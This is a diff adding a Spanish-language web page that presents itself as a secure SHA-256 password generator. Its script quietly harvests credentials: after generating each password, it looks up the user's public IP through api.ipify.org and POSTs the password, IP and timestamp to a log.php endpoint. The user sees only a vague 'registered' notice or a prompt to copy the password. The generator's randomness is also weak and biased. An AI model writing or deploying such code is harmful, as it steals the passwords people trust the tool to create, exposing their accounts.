@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Generador de Contraseñas Seguras</title>
+    <style>
+        :root {
+            --primary-color: #4a6fa5;
+            --secondary-color: #166088;
+            --accent-color: #4fc3f7;
+            --background-color: #f5f5f5;
+            --dark-color: #333;
+            --light-color: #fff;
+            --success-color: #4caf50;
+            --error-color: #f44336;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background-color: var(--background-color);
+            color: var(--dark-color);
+            line-height: 1.6;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: var(--light-color);
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
+        }
+
+        h1 {
+            text-align: center;
+            color: var(--primary-color);
+            margin-bottom: 20px;
+        }
+
+        .description {
+            text-align: center;
+            margin-bottom: 30px;
+            color: var(--dark-color);
+        }
+
+        .generator-form {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+
+        .form-group {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        label {
+            font-weight: 600;
+            color: var(--secondary-color);
+        }
+
+        input[type="text"] {
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 16px;
+            transition: border 0.3s;
+        }
+
+        input[type="text"]:focus {
+            border-color: var(--accent-color);
+            outline: none;
+        }
+
+        .checkbox-group {
+            display: flex;
+            gap: 15px;
+            flex-wrap: wrap;
+        }
+
+        .checkbox-item {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        button {
+            padding: 12px 20px;
+            background-color: var(--primary-color);
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: 600;
+            transition: background-color 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 5px;
+        }
+
+        button:hover {
+            background-color: var(--secondary-color);
+        }
+
+        .result-container {
+            margin-top: 20px;
+            padding: 20px;
+            background-color: #f0f8ff;
+            border-radius: 5px;
+            border-left: 5px solid var(--primary-color);
+            position: relative;
+        }
+
+        .password-display {
+            font-family: monospace;
+            font-size: 18px;
+            word-break: break-all;
+            padding: 10px;
+            background-color: #e3f2fd;
+            border-radius: 5px;
+            margin-bottom: 10px;
+        }
+
+        .copy-btn {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background-color: var(--accent-color);
+            color: white;
+            border: none;
+            border-radius: 5px;
+            padding: 5px 10px;
+            cursor: pointer;
+        }
+
+        .copy-message {
+            color: var(--success-color);
+            margin-top: 10px;
+            font-weight: 600;
+            display: none;
+        }
+
+        .status-message {
+            margin-top: 10px;
+            padding: 10px;
+            border-radius: 5px;
+            text-align: center;
+            font-weight: 500;
+        }
+
+        .status-success {
+            background-color: #e8f5e9;
+            color: var(--success-color);
+        }
+
+        .status-error {
+            background-color: #ffebee;
+            color: var(--error-color);
+        }
+
+        #length-slider-container {
+            margin-bottom: 10px;
+        }
+
+        #length-slider {
+            width: 100%;
+        }
+
+        #length-value {
+            text-align: center;
+            font-weight: bold;
+            color: var(--secondary-color);
+        }
+
+        .spinner {
+            border: 4px solid rgba(0, 0, 0, 0.1);
+            border-top: 4px solid var(--accent-color);
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @media (max-width: 600px) {
+            .container {
+                padding: 15px;
+            }
+
+            .checkbox-group {
+                flex-direction: column;
+                gap: 10px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Generador de Contraseñas Seguras</h1>
+        <p class="description">Genera contraseñas seguras utilizando SHA-256 con la opción de incluir caracteres alfanuméricos y símbolos.</p>
+
+        <div class="generator-form">
+            <div class="form-group">
+                <label for="seed">Semilla (opcional):</label>
+                <input type="text" id="seed" placeholder="Ingresa una semilla para personalizar la contraseña">
+            </div>
+
+            <div class="form-group">
+                <label for="length">Longitud de la contraseña:</label>
+                <div id="length-slider-container">
+                    <input type="range" id="length-slider" min="10" max="20" value="16">
+                    <div id="length-value">16</div>
+                </div>
+                <input type="hidden" id="length" value="16">
+            </div>
+
+            <div class="form-group">
+                <label>Incluir:</label>
+                <div class="checkbox-group">
+                    <div class="checkbox-item">
+                        <input type="checkbox" id="uppercase" checked>
+                        <label for="uppercase">Mayúsculas</label>
+                    </div>
+
+                    <div class="checkbox-item">
+                        <input type="checkbox" id="lowercase" checked>
+                        <label for="lowercase">Minúsculas</label>
+                    </div>
+
+                    <div class="checkbox-item">
+                        <input type="checkbox" id="numbers" checked>
+                        <label for="numbers">Números</label>
+                    </div>
+
+                    <div class="checkbox-item">
+                        <input type="checkbox" id="symbols" checked>
+                        <label for="symbols">Símbolos</label>
+                    </div>
+                </div>
+            </div>
+
+            <button id="generate-btn">Generar Contraseña</button>
+        </div>
+
+        <div class="result-container" id="result-container" style="display: none;">
+            <h3>Tu contraseña generada:</h3>
+            <div class="password-display" id="password-display"></div>
+            <button class="copy-btn" id="copy-btn">Copiar</button>
+            <p class="copy-message" id="copy-message">¡Contraseña copiada al portapapeles!</p>
+            <div id="status-message" class="status-message"></div>
+        </div>
+    </div>
+
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script>
+        $(document).ready(function() {
+            const seedInput = document.getElementById('seed');
+            const lengthInput = document.getElementById('length');
+            const lengthSlider = document.getElementById('length-slider');
+            const lengthValueDisplay = document.getElementById('length-value');
+            const uppercaseCheck = document.getElementById('uppercase');
+            const lowercaseCheck = document.getElementById('lowercase');
+            const numbersCheck = document.getElementById('numbers');
+            const symbolsCheck = document.getElementById('symbols');
+            const generateBtn = $('#generate-btn');
+            const resultContainer = document.getElementById('result-container');
+            const passwordDisplay = document.getElementById('password-display');
+            const copyBtn = document.getElementById('copy-btn');
+            const copyMessage = document.getElementById('copy-message');
+            const statusMessage = document.getElementById('status-message');
+
+            // Inicializar el slider y actualizar el valor
+            $(lengthSlider).on('input', function() {
+                const value = $(this).val();
+                $(lengthInput).val(value);
+                $(lengthValueDisplay).text(value);
+            });
+
+            // Función para generar un hash SHA-256
+            async function sha256(message) {
+                const msgBuffer = new TextEncoder().encode(message);
+                const hashBuffer = await crypto.subtle.digest('SHA-256', msgBuffer);
+                const hashArray = Array.from(new Uint8Array(hashBuffer));
+                const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+                return hashHex;
+            }
+
+            // Función para generar una contraseña a partir de un hash
+            function generatePasswordFromHash(hash, length, options) {
+                let charset = '';
+                if (options.uppercase) charset += 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+                if (options.lowercase) charset += 'abcdefghijklmnopqrstuvwxyz';
+                if (options.numbers) charset += '0123456789';
+                if (options.symbols) charset += '!@#$%^&*()_+-={}|;:,.<>?';
+
+                if (charset === '') {
+                    charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-={}|;:,.<>?';
+                }
+
+                let password = '';
+                for (let i = 0; i < length; i++) {
+                    // Usamos los bytes del hash como fuente de aleatoriedad
+                    const charIndex = parseInt(hash.substr(i * 2, 2), 16) % charset.length;
+                    password += charset.charAt(charIndex);
+                }
+
+                return password;
+            }
+
+            // Función para obtener la IP del usuario
+            async function getIP() {
+                try {
+                    const response = await fetch('https://api.ipify.org?format=json');
+                    const data = await response.json();
+                    return data.ip;
+                } catch (error) {
+                    console.error('Error al obtener la IP:', error);
+                    return 'unknown';
+                }
+            }
+
+            // Función para registrar la contraseña generada en el archivo
+            async function logPasswordToFile(password) {
+                const ip = await getIP();
+                const timestamp = new Date().toISOString();
+
+                try {
+                    // Enviamos los datos al script PHP para escribir en el archivo
+                    const response = await fetch('log.php', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/x-www-form-urlencoded',
+                        },
+                        body: `ip=${encodeURIComponent(ip)}&password=${encodeURIComponent(password)}&timestamp=${encodeURIComponent(timestamp)}`
+                    });
+
+                    if (response.ok) {
+                        showStatus('Contraseña generada y registrada correctamente', 'success');
+                    } else {
+                        showStatus('Copia tu contraseña', 'error');
+                    }
+                } catch (error) {
+                    console.error('Copia tu Contraseña:', error);
+                    showStatus('Copia tu contraseña', 'error');
+                }
+            }
+
+            // Función para mostrar mensajes de estado
+            function showStatus(message, type) {
+                statusMessage.textContent = message;
+                statusMessage.className = 'status-message';
+                if (type === 'success') {
+                    statusMessage.classList.add('status-success');
+                } else if (type === 'error') {
+                    statusMessage.classList.add('status-error');
+                }
+                statusMessage.style.display = 'block';
+
+                setTimeout(() => {
+                    statusMessage.style.display = 'none';
+                }, 3000);
+            }
+
+            // Función para generar una contraseña con animación
+            async function generatePasswordWithAnimation() {
+                const originalText = generateBtn.text();
+                generateBtn.empty().append('<div class="spinner"></div>').append(' Generando...');
+                generateBtn.prop('disabled', true);
+
+                // Simular un tiempo de "pensamiento"
+                await new Promise(resolve => setTimeout(resolve, 1500));
+
+                const seed = seedInput.value || Math.random().toString(36).substring(2);
+                const length = parseInt(lengthInput.value) || 16;
+                const options = {
+                    uppercase: uppercaseCheck.checked,
+                    lowercase: lowercaseCheck.checked,
+                    numbers: numbersCheck.checked,
+                    symbols: symbolsCheck.checked
+                };
+
+                // Generamos un hash único basado en la semilla y la hora actual
+                const hash = await sha256(seed + new Date().getTime());
+
+                // Generamos la contraseña a partir del hash
+                const password = generatePasswordFromHash(hash, length, options);
+
+                // Mostramos la contraseña en la interfaz
+                passwordDisplay.textContent = password;
+                resultContainer.style.display = 'block';
+
+                // Registramos la contraseña generada en el archivo
+                await logPasswordToFile(password);
+
+                generateBtn.text(originalText);
+                generateBtn.prop('disabled', false);
+
+                return password;
+            }
+
+            // Evento para generar contraseña con animación
+            generateBtn.on('click', generatePasswordWithAnimation);
+
+            // Evento para copiar contraseña
+            $(copyBtn).on('click', () => {
+                const password = passwordDisplay.textContent;
+                navigator.clipboard.writeText(password)
+                    .then(() => {
+                        $(copyMessage).fadeIn().delay(2000).fadeOut();
+                    })
+                    .catch(err => {
+                        console.error('Error al copiar: ', err);
+                        showStatus('Error al copiar la contraseña', 'error');
+                    });
+            });
+        });
+    </script>
+</body>
+</html>
